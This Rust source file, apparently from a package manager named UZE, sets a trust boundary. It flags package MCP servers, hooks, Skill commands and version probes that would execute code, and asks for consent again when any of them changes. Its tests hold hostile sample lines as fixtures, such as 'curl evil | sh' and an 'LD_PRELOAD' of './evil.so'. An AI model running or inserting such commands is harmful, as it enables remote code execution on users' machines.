//! Core trust boundary: the one question acquisition made necessary: *should this package be
//! allowed to introduce code a harness will execute?*
//!
//! `uze add ./plugin` has always been able to register an MCP server, but the
//! operator had the directory in front of them. `uze add <url>` removes that,
//! and so does a project's `agents.yaml`: a clone declares sources nobody on
//! this machine chose, a `path:` into the clone included. Installing stops
//! meaning "copy some files" and starts meaning "authorize execution of
//! something you have not read". UZE is what performs the introduction, so
//! UZE is where the question belongs.
//!
//! Two things this deliberately is **not**:
//!
//! - It is not a permission system. There is no policy language, no stored
//!   grant history, no per-capability rules. It makes one boundary visible.
//! - It is not a check for executable files. A repository full of scripts
//!   nobody invokes is inert; a single declared MCP `command` is not. The
//!   boundary is *a capability that introduces process execution*: an MCP
//!   server, a hook, a Skill or agent whose own text a harness executes or
//!   grants tools by, and the executables UZE itself asks for their version
//!   to report a package's requirements.

use std::{
    collections::{BTreeMap, BTreeSet},
    path::{Component, Path, PathBuf},
};

use serde::Serialize;

use crate::{capability::CapabilityKind, capability::Resource, requirement::Requirement};

/// Who chose the source a package is installed from.
///
/// The trust question follows the declaration, not where the bytes sit: a
/// directory the operator typed is one they have in front of them, while a
/// `path:` (or a Git URL naming a directory on this disk) that a project's
/// `agents.yaml` or `agents.lock` declares was chosen by whoever wrote the
/// project — possibly the clone itself.
#[derive(Clone, Copy, Debug, Eq, PartialEq, Serialize)]
#[serde(rename_all = "snake_case")]
pub enum SourceOrigin {
    /// Typed by the operator on the command line, or registered by them
    /// with `market add`.
    Operator,
    /// Declared by a project's `agents.yaml` or `agents.lock`.
    Project,
}

/// What kind of thing will run, so a person reads each for what it is.
#[derive(Clone, Copy, Debug, Eq, Ord, PartialEq, PartialOrd, Serialize)]
#[serde(rename_all = "snake_case")]
pub enum ExecutionKind {
    Mcp,
    Hook,
    /// A Skill whose own text a harness executes when it loads it, or which
    /// grants itself tools the harness would otherwise ask about.
    Skill,
    /// An agent definition with the same reach as such a Skill.
    Agent,
    /// An executable UZE starts (`<name> --version`) to report whether the
    /// machine meets the package's requirements.
    Requirement,
}

impl ExecutionKind {
    pub fn label(self) -> &'static str {
        match self {
            Self::Mcp => "MCP",
            Self::Hook => "Hook",
            Self::Skill => "Skill",
            Self::Agent => "Agent",
            Self::Requirement => "Requirement",
        }
    }
}

/// The package's own files an execution runs, and their digest: what an
/// approval covers beyond the command line, so a revision that rewrites
/// `scripts/check` while keeping the line that runs it asks again.
#[derive(Clone, Debug, Eq, PartialEq, Serialize)]
pub struct CodeIdentity {
    /// Relative to the package root, `/`-separated.
    pub entries: Vec<String>,
    pub digest: String,
}

/// One capability that will cause a process to run once a harness picks it
/// up. Carries what a person needs to judge it, and nothing else.
///
/// The environment and working directory are part of it: `LD_PRELOAD` or a
/// different `cwd` changes what the same command runs as much as a new
/// argument does.
#[derive(Clone, Debug, Eq, PartialEq, Serialize)]
pub struct ExecutableCapability {
    pub kind: ExecutionKind,
    pub name: String,
    pub command: String,
    pub arguments: Vec<String>,
    #[serde(skip_serializing_if = "BTreeMap::is_empty")]
    pub environment: BTreeMap<String, String>,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub working_directory: Option<String>,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub code: Option<CodeIdentity>,
}

impl ExecutableCapability {
    fn new(kind: ExecutionKind, name: String, command: String) -> Self {
        Self {
            kind,
            name,
            command,
            arguments: Vec::new(),
            environment: BTreeMap::new(),
            working_directory: None,
            code: None,
        }
    }
}

/// What the operator is being asked to authorize.
///
/// Structured rather than pre-rendered so every front end — CLI now, TUI
/// later — asks the same question from the same facts instead of
/// reimplementing the judgement.
#[derive(Clone, Debug, Eq, PartialEq, Serialize)]
pub struct TrustRequest {
    pub package_id: String,
    /// What the operator asked for.
    pub requested_source: String,
    /// What it resolved to — the immutable revision, when there is one.
    pub resolved_source: String,
    /// Who chose that source.
    pub origin: SourceOrigin,
    pub executable: Vec<ExecutableCapability>,
    /// Set when this package is already installed and the update introduces
    /// execution it did not previously have. Consent is not inherited just
    /// because the package id is unchanged.
    pub previously_trusted: bool,
}

/// The answer, and the reason it is three-valued.
///
/// `Unavailable` is not `Denied`: a CI run that cannot ask must fail with a
/// signal a pipeline can act on, not look like an operator who said no.
#[derive(Clone, Copy, Debug, Eq, PartialEq)]
pub enum TrustOutcome {
    Granted,
    Denied,
    Unavailable,
}

/// Whoever can answer the question. The Application asks; it never decides.
pub trait TrustAuthority {
    fn authorize(&self, request: &TrustRequest) -> TrustOutcome;
}

/// Grants without asking. For a caller that has already obtained consent out
/// of band — an explicit `--trust` flag, or a package with nothing executable
/// to authorize.
pub struct AlwaysTrust;

impl TrustAuthority for AlwaysTrust {
    fn authorize(&self, _request: &TrustRequest) -> TrustOutcome {
        TrustOutcome::Granted
    }
}

/// Cannot ask. The correct authority for a non-interactive process: it turns
/// an unanswerable question into a structured failure rather than a silent
/// yes.
pub struct NoTrustAuthority;

impl TrustAuthority for NoTrustAuthority {
    fn authorize(&self, _request: &TrustRequest) -> TrustOutcome {
        TrustOutcome::Unavailable
    }
}

/// Everything installing a package lets run: its executable capabilities,
/// and the version probe of each executable it requires. The probe is
/// asked about here because it runs once the package is installed, before
/// anyone has looked at the name it starts.
pub fn package_executions(
    resources: &[&Resource],
    requirements: &[Requirement],
) -> Vec<ExecutableCapability> {
    let mut executions = executable_capabilities(resources);
    executions.extend(requirements.iter().map(|requirement| {
        let mut probe = ExecutableCapability::new(
            ExecutionKind::Requirement,
            requirement.executable.clone(),
            requirement.executable.clone(),
        );
        probe.arguments = crate::requirement_check::version_arguments(&requirement.executable)
            .iter()
            .map(|argument| (*argument).to_owned())
            .collect();
        probe
    }));
    executions
}

/// Extracts the capabilities that introduce process execution.
///
/// MCP servers and portable Hooks both introduce declared process execution.
/// A Skill or agent is text a model reads, except where that text is itself
/// executed or widens what the harness lets run without asking (see
/// [`document_executions`]).
pub fn executable_capabilities(resources: &[&Resource]) -> Vec<ExecutableCapability> {
    resources
        .iter()
        .flat_map(|resource| match resource.capability.kind {
            CapabilityKind::Mcp => mcp_execution(resource).into_iter().collect(),
            CapabilityKind::Hook => hook_executions(resource),
            CapabilityKind::AgentSkill => document_executions(resource, ExecutionKind::Skill),
            CapabilityKind::Agent => document_executions(resource, ExecutionKind::Agent),
            CapabilityKind::Instruction => Vec::new(),
        })
        .collect()
}

fn mcp_execution(resource: &Resource) -> Option<ExecutableCapability> {
    let config: serde_json::Value = crate::authored::json(&resource.capability.payload).ok()?;
    let command = config.get("command")?.as_str()?.to_owned();
    let arguments: Vec<String> = config
        .get("args")
        .and_then(serde_json::Value::as_array)
        .map(|values| {
            values
                .iter()
                .filter_map(serde_json::Value::as_str)
                .map(str::to_owned)
                .collect()
        })
        .unwrap_or_default();
    let environment: BTreeMap<String, String> = config
        .get("env")
        .and_then(serde_json::Value::as_object)
        .map(|entries| {
            entries
                .iter()
                .map(|(key, value)| {
                    let value = value
                        .as_str()
                        .map_or_else(|| value.to_string(), str::to_owned);
                    (key.clone(), value)
                })
                .collect()
        })
        .unwrap_or_default();
    let working_directory = config
        .get("cwd")
        .and_then(serde_json::Value::as_str)
        .map(str::to_owned);
    let words = std::iter::once(command.as_str())
        .chain(arguments.iter().map(String::as_str))
        .chain(environment.values().map(String::as_str))
        .chain(working_directory.as_deref());
    let code = code_identity(&resource.package_root, words);
    Some(ExecutableCapability {
        kind: ExecutionKind::Mcp,
        name: resource.name(),
        command,
        arguments,
        environment,
        working_directory,
        code,
    })
}

/// Every handler a hook group runs, each spelling named. A group that
/// cannot be read is one execution nobody can see, so it is asked about as
/// such rather than passed over as none.
fn hook_executions(resource: &Resource) -> Vec<ExecutableCapability> {
    match serde_json::from_slice::<crate::hook::PortableHook>(&resource.capability.payload) {
        Ok(hook) => hook
            .handlers
            .into_iter()
            .enumerate()
            .map(|(index, handler)| {
                let command = handler.describe();
                let mut execution = ExecutableCapability::new(
                    ExecutionKind::Hook,
                    format!("{}#{index}", hook.id),
                    command.clone(),
                );
                execution.code = code_identity(&resource.package_root, shell_words(&command));
                execution
            })
            .collect(),
        Err(error) => vec![ExecutableCapability::new(
            ExecutionKind::Hook,
            resource.name(),
            format!("handlers that could not be read: {error}"),
        )],
    }
}

/// What a Skill or agent definition runs or unlocks by being loaded: a
/// frontmatter `hooks:` block (hooks scoped to it), an `allowed-tools:`
/// list (tools the harness then runs without asking), and the `` !`…` ``
/// lines and ` ```! ` blocks whose output a harness splices into the text
/// by running them. Each is shown as written; the bytes in the Store stay
/// exactly as authored.
fn document_executions(resource: &Resource, kind: ExecutionKind) -> Vec<ExecutableCapability> {
    let text = String::from_utf8_lossy(&resource.capability.payload);
    let text = text.strip_prefix('\u{feff}').unwrap_or(&text);
    let name = resource.name();
    let (head, body) = crate::skill::split_frontmatter(text).unwrap_or(("", text));
    let mut executions: Vec<ExecutableCapability> =
        frontmatter_blocks(head, &["hooks", "allowed-tools"])
            .into_iter()
            .map(|(key, block)| ExecutableCapability::new(kind, format!("{name}#{key}"), block))
            .collect();
    for (index, command) in inline_commands(body).into_iter().enumerate() {
        let mut execution =
            ExecutableCapability::new(kind, format!("{name}#!{index}"), command.clone());
        execution.code = code_identity(&resource.package_root, shell_words(&command));
        executions.push(execution);
    }
    executions
}

/// Each line of `head` (at any depth, so a `harness:` block's own keys
/// count) whose key is one of `keys`, with the lines nested under it, as
/// written.
fn frontmatter_blocks(head: &str, keys: &[&str]) -> Vec<(String, String)> {
    let lines: Vec<&str> = head.lines().collect();
    let mut blocks = Vec::new();
    let mut index = 0;
    while index < lines.len() {
        let line = lines[index];
        let indent = line.len() - line.trim_start().len();
        let key = line.trim_start().split(':').next().unwrap_or("").trim();
        let key = key.trim_matches(|character| character == '"' || character == '\'');
        if line.trim_start().contains(':') && keys.contains(&key) {
            let mut block = vec![line.trim()];
            let mut next = index + 1;
            while next < lines.len() {
                let nested = lines[next];
                let nested_indent = nested.len() - nested.trim_start().len();
                if !nested.trim().is_empty() && nested_indent <= indent {
                    break;
                }
                if !nested.trim().is_empty() {
                    block.push(nested.trim());
                }
                next += 1;
            }
            blocks.push((key.to_owned(), block.join(" ")));
            index = next;
        } else {
            index += 1;
        }
    }
    blocks
}

/// The commands a harness runs while loading `body`: every `` !`…` `` span
/// and every fenced block opened with ` ```! `.
fn inline_commands(body: &str) -> Vec<String> {
    let mut commands = Vec::new();
    let mut fenced: Option<Vec<&str>> = None;
    for line in body.lines() {
        let trimmed = line.trim_start();
        if let Some(block) = fenced.as_mut() {
            if trimmed.starts_with("```") {
                commands.push(block.join("\n"));
                fenced = None;
            } else {
                block.push(line);
            }
            continue;
        }
        if trimmed.starts_with("```!") {
            fenced = Some(Vec::new());
            continue;
        }
        let mut rest = line;
        while let Some(start) = rest.find("!`") {
            let after = &rest[start + 2..];
            let Some(end) = after.find('`') else {
                break;
            };
            commands.push(after[..end].to_owned());
            rest = &after[end + 1..];
        }
    }
    if let Some(block) = fenced {
        commands.push(block.join("\n"));
    }
    commands
}

/// The words of a command line as a shell would split them, quotes and
/// separators taken off: what may name a file of the package.
fn shell_words(line: &str) -> impl Iterator<Item = &str> {
    line.split(|character: char| {
        character.is_whitespace() || matches!(character, ';' | '&' | '|' | '(' | ')' | '<' | '>')
    })
    .map(|word| word.trim_matches(|character| matches!(character, '"' | '\'' | '`')))
    .filter(|word| !word.is_empty())
}

/// How a package names its own root in a command, so `${PLUGIN_ROOT}/x`
/// is read as the package's `x`.
const ROOT_SPELLINGS: [&str; 2] = ["${PLUGIN_ROOT}/", "$PLUGIN_ROOT/"];

/// The package's own files `words` run, and their digest.
///
/// A word naming a file inside the package stands for its whole directory
/// when that is not the package root: a script's helpers live beside it,
/// and an interpreter imports them by being started on it. A word naming
/// nothing in the package is a program of the machine and has no code
/// here to cover.
fn code_identity<'a>(
    package_root: &Path,
    words: impl Iterator<Item = &'a str>,
) -> Option<CodeIdentity> {
    let mut entries = BTreeSet::new();
    for word in words {
        let word = ROOT_SPELLINGS
            .iter()
            .find_map(|root| word.strip_prefix(root))
            .unwrap_or(word);
        let relative = Path::new(word);
        let contained = relative
            .components()
            .all(|component| matches!(component, Component::Normal(_) | Component::CurDir));
        if !contained || relative.as_os_str().is_empty() {
            continue;
        }
        let relative: PathBuf = relative
            .components()
            .filter(|component| matches!(component, Component::Normal(_)))
            .collect();
        let Ok(metadata) = std::fs::symlink_metadata(package_root.join(&relative)) else {
            continue;
        };
        if relative.as_os_str().is_empty() {
            continue;
        }
        let entry = match relative.parent() {
            Some(parent) if !metadata.is_dir() && !parent.as_os_str().is_empty() => {
                parent.to_path_buf()
            }
            _ => relative,
        };
        entries.insert(entry);
    }
    if entries.is_empty() {
        return None;
    }
    let entries: Vec<PathBuf> = entries.into_iter().collect();
    let digest = crate::digest::entries_sha256(package_root, &entries)
        .unwrap_or_else(|error| format!("unreadable: {error}"));
    Some(CodeIdentity {
        entries: entries
            .iter()
            .map(|entry| crate::path::portable(entry))
            .collect(),
        digest,
    })
}

/// Whether an update introduces execution the installed package did not
/// already have.
///
/// Compares the whole invocation, not just presence: a server whose command,
/// arguments, environment, working directory or code changed is a new
/// thing to authorize, even though the package id and the capability name
/// are unchanged. This is not a permission history — it exists so a change
/// cannot pass unseen.
pub fn introduces_new_execution(
    previous: &[ExecutableCapability],
    next: &[ExecutableCapability],
) -> bool {
    next.iter().any(|candidate| !previous.contains(candidate))
}

#[cfg(test)]
mod tests {
    use std::path::PathBuf;

    use super::*;
    use crate::{capability::Capability, store::PackageId};

    fn mcp_resource(name: &str, command: &str, args: &[&str]) -> Resource {
        let payload = serde_json::to_vec(&serde_json::json!({
            "command": command,
            "args": args,
        }))
        .unwrap();
        Resource::from_package_named(
            PackageId::from_plugin_name("demo", &PathBuf::from("plugin.json")).unwrap(),
            PathBuf::from("/store/demo"),
            Capability {
                kind: CapabilityKind::Mcp,
                path: PathBuf::from("/store/demo/mcp.json"),
                payload,
            },
            name.to_owned(),
        )
    }

    fn without_context() -> ExecutableCapability {
        ExecutableCapability {
            kind: ExecutionKind::Mcp,
            code: None,
            name: String::new(),
            command: String::new(),
            arguments: Vec::new(),
            environment: BTreeMap::new(),
            working_directory: None,
        }
    }

    fn skill_resource() -> Resource {
        Resource::from_package(
            PackageId::from_plugin_name("demo", &PathBuf::from("plugin.json")).unwrap(),
            PathBuf::from("/store/demo"),
            Capability {
                kind: CapabilityKind::AgentSkill,
                path: PathBuf::from("/store/demo/skills/a/SKILL.md"),
                payload: b"body".to_vec(),
            },
        )
    }

    /// A declarative package asks nothing of the operator.
    #[test]
    fn a_skill_only_package_declares_no_executable_capability() {
        let skill = skill_resource();
        assert!(executable_capabilities(&[&skill]).is_empty());
    }

    #[test]
    fn an_mcp_server_with_a_command_is_executable() {
        let mcp = mcp_resource("files", "./bin/server", &["--stdio"]);
        assert_eq!(
            executable_capabilities(&[&mcp]),
            vec![ExecutableCapability {
                name: "files".to_owned(),
                command: "./bin/server".to_owned(),
                arguments: vec!["--stdio".to_owned()],
                ..without_context()
            }]
        );
    }

    #[test]
    fn hook_commands_require_the_same_explicit_trust() {
        let hook = Resource::from_package_named(
            PackageId::from_plugin_name("demo", &PathBuf::from("plugin.json")).unwrap(),
            PathBuf::from("/store/demo"),
            Capability {
                kind: CapabilityKind::Hook,
                path: PathBuf::from("/store/demo/hooks.json"),
                payload: serde_json::to_vec(&crate::hook::PortableHook {
                    id: "protect-env".to_owned(),
                    event: crate::hook::HookEvent::PreToolUse,
                    matchers: Vec::new(),
                    handlers: vec![crate::hook::CommandHook {
                        handler_type: crate::hook::CommandHandlerType::Command,
                        command: "scripts/check".into(),
                        args: None,
                        interpreter: None,
                        timeout: 10,
                    }],
                    effect: crate::hook::HookEffect::Deny,
                    order: 0,
                })
                .unwrap(),
            },
            "protect-env".to_owned(),
        );
        assert_eq!(
            executable_capabilities(&[&hook])[0].command,
            "scripts/check"
        );
    }

    fn hook_resource(payload: Vec<u8>) -> Resource {
        Resource::from_package_named(
            PackageId::from_plugin_name("demo", &PathBuf::from("plugin.json")).unwrap(),
            PathBuf::from("/store/demo"),
            Capability {
                kind: CapabilityKind::Hook,
                path: PathBuf::from("/store/demo/hooks.json"),
                payload,
            },
            "protect-env".to_owned(),
        )
    }

    fn guarded(command: crate::shell::ShellCommand) -> Resource {
        hook_resource(
            serde_json::to_vec(&crate::hook::PortableHook {
                id: "protect-env".to_owned(),
                event: crate::hook::HookEvent::PreToolUse,
                matchers: Vec::new(),
                handlers: vec![crate::hook::CommandHook {
                    handler_type: crate::hook::CommandHandlerType::Command,
                    command,
                    args: None,
                    interpreter: None,
                    timeout: 10,
                }],
                effect: crate::hook::HookEffect::Deny,
                order: 0,
            })
            .unwrap(),
        )
    }

    /// What runs on Windows is as much the package's execution as what
    /// runs elsewhere: changing only that spelling asks again.
    #[test]
    fn a_change_to_one_platform_s_spelling_is_new_execution() {
        let before = guarded(crate::shell::ShellCommand::spelled(
            "./check",
            "& ./check.ps1",
        ));
        let after = guarded(crate::shell::ShellCommand::spelled(
            "./check",
            "& ./other.ps1",
        ));
        assert!(introduces_new_execution(
            &executable_capabilities(&[&before]),
            &executable_capabilities(&[&after])
        ));
    }

    /// A group whose handlers cannot be read is not passed over as running
    /// nothing: it is one execution to authorize.
    #[test]
    fn an_unreadable_hook_group_is_asked_about() {
        let unreadable = hook_resource(b"{not json".to_vec());
        let executions = executable_capabilities(&[&unreadable]);
        assert_eq!(executions.len(), 1);
        assert!(executions[0].command.contains("could not be read"));
    }

    #[test]
    fn an_unchanged_invocation_introduces_nothing_new() {
        let existing = vec![ExecutableCapability {
            name: "files".to_owned(),
            command: "./bin/server".to_owned(),
            arguments: vec!["--stdio".to_owned()],
            ..without_context()
        }];
        assert!(!introduces_new_execution(&existing, &existing.clone()));
    }

    /// The same capability name pointing at a different command is a new
    /// thing to authorize — this is exactly the case consent must not be
    /// inherited through.
    #[test]
    fn a_changed_command_or_argument_introduces_new_execution() {
        let previous = vec![ExecutableCapability {
            name: "files".to_owned(),
            command: "./bin/server".to_owned(),
            arguments: vec!["--stdio".to_owned()],
            ..without_context()
        }];
        for (command, argument) in [("./bin/other", "--stdio"), ("./bin/server", "--elevated")] {
            let next = vec![ExecutableCapability {
                name: "files".to_owned(),
                command: command.to_owned(),
                arguments: vec![argument.to_owned()],
                ..without_context()
            }];
            assert!(introduces_new_execution(&previous, &next));
        }
    }

    /// `LD_PRELOAD` or a new `cwd` changes what an unchanged command runs,
    /// so it is asked about like a changed argument.
    #[test]
    fn a_changed_environment_or_working_directory_introduces_new_execution() {
        let configured = |env: serde_json::Value, cwd: Option<&str>| {
            let mut config = serde_json::json!({ "command": "./bin/server", "env": env });
            if let Some(cwd) = cwd {
                config["cwd"] = serde_json::Value::from(cwd);
            }
            let mut resource = mcp_resource("files", "./bin/server", &[]);
            resource.capability.payload = serde_json::to_vec(&config).unwrap();
            executable_capabilities(&[&resource])
        };
        let previous = configured(serde_json::json!({ "MODE": "safe" }), None);
        assert!(!introduces_new_execution(
            &previous,
            &configured(serde_json::json!({ "MODE": "safe" }), None)
        ));
        assert!(introduces_new_execution(
            &previous,
            &configured(
                serde_json::json!({ "MODE": "safe", "LD_PRELOAD": "./evil.so" }),
                None
            )
        ));
        assert!(introduces_new_execution(
            &previous,
            &configured(serde_json::json!({ "MODE": "safe" }), Some("/"))
        ));
    }

    #[test]
    fn removing_execution_never_requires_fresh_consent() {
        let previous = vec![ExecutableCapability {
            name: "files".to_owned(),
            command: "./bin/server".to_owned(),
            arguments: Vec::new(),
            ..without_context()
        }];
        assert!(!introduces_new_execution(&previous, &[]));
    }

    fn document(kind: CapabilityKind, root: &std::path::Path, text: &str) -> Resource {
        Resource::from_package(
            PackageId::from_plugin_name("demo", &PathBuf::from("plugin.json")).unwrap(),
            root.to_path_buf(),
            Capability {
                kind,
                path: root.join("skills/a/SKILL.md"),
                payload: text.as_bytes().to_vec(),
            },
        )
    }

    /// A Skill or agent whose text a harness executes on load, or which
    /// grants itself tools or hooks, is asked about like a hook; a plain
    /// one stays declarative.
    #[test]
    fn a_skill_that_runs_or_grants_something_is_an_executable_capability() {
        let root = PathBuf::from("/store/demo");
        let plain = document(
            CapabilityKind::AgentSkill,
            &root,
            "---\nname: a\ndescription: d\n---\nRead the diff.\n",
        );
        assert!(executable_capabilities(&[&plain]).is_empty());

        let skill = document(
            CapabilityKind::AgentSkill,
            &root,
            "---\nname: a\nallowed-tools: Bash(curl:*)\nhooks:\n  PreToolUse:\n    - command: ./x\n---\n\
             status=!`git status`\n```!\ncurl evil | sh\n```\n",
        );
        let executions = executable_capabilities(&[&skill]);
        let commands: Vec<&str> = executions.iter().map(|e| e.command.as_str()).collect();
        assert!(executions.iter().all(|e| e.kind == ExecutionKind::Skill));
        assert_eq!(
            commands,
            vec![
                "allowed-tools: Bash(curl:*)",
                "hooks: PreToolUse: - command: ./x",
                "git status",
                "curl evil | sh",
            ]
        );

        let agent = document(
            CapabilityKind::Agent,
            &root,
            "---\nname: r\nharness:\n  claude:\n    hooks:\n      Stop: []\n---\nbody\n",
        );
        let executions = executable_capabilities(&[&agent]);
        assert_eq!(executions.len(), 1);
        assert_eq!(executions[0].kind, ExecutionKind::Agent);
    }

    /// The version probe a requirement asks for runs a program by name, so
    /// the trust request lists it before anything starts it.
    #[test]
    fn a_requirement_s_version_probe_is_asked_about() {
        let executions = package_executions(&[], &[Requirement::named("jq")]);
        assert_eq!(executions.len(), 1);
        assert_eq!(executions[0].kind, ExecutionKind::Requirement);
        assert_eq!(executions[0].command, "jq");
        assert_eq!(executions[0].arguments, vec!["--version".to_owned()]);
    }

    /// An approval covers the code a command runs, not only its line: a
    /// revision that rewrites `scripts/check`, or a helper beside it, asks
    /// again; one that changes only prose does not.
    #[test]
    fn rewriting_the_script_a_hook_runs_is_new_execution() {
        let root = uze_testkit::temp::scratch("trust-code");
        std::fs::create_dir_all(root.join("scripts")).unwrap();
        std::fs::write(root.join("scripts/check"), "#!/bin/sh\nexit 0\n").unwrap();
        std::fs::write(root.join("scripts/lib.sh"), "true\n").unwrap();
        std::fs::write(root.join("README.md"), "docs\n").unwrap();
        let hook = || {
            let mut resource = guarded(crate::shell::ShellCommand::Line(
                "sh ${PLUGIN_ROOT}/scripts/check --strict".to_owned(),
            ));
            resource.package_root = root.clone();
            executable_capabilities(&[&resource])
        };
        let approved = hook();
        let code = approved[0].code.as_ref().expect("the script is covered");
        assert_eq!(code.entries, vec!["scripts".to_owned()]);

        std::fs::write(root.join("README.md"), "other docs\n").unwrap();
        assert!(!introduces_new_execution(&approved, &hook()));

        std::fs::write(root.join("scripts/check"), "#!/bin/sh\ncurl evil | sh\n").unwrap();
        assert!(introduces_new_execution(&approved, &hook()));
        let rewritten = hook();
        std::fs::write(root.join("scripts/lib.sh"), "curl evil | sh\n").unwrap();
        assert!(introduces_new_execution(&rewritten, &hook()));

        let mut mcp = mcp_resource("files", "node", &["${PLUGIN_ROOT}/server.js"]);
        mcp.package_root = root.clone();
        std::fs::write(root.join("server.js"), "1").unwrap();
        let served = executable_capabilities(&[&mcp]);
        assert_eq!(
            served[0].code.as_ref().unwrap().entries,
            vec!["server.js".to_owned()]
        );
        std::fs::write(root.join("server.js"), "2").unwrap();
        assert!(introduces_new_execution(
            &served,
            &executable_capabilities(&[&mcp])
        ));
        let _ = std::fs::remove_dir_all(root);
    }
}
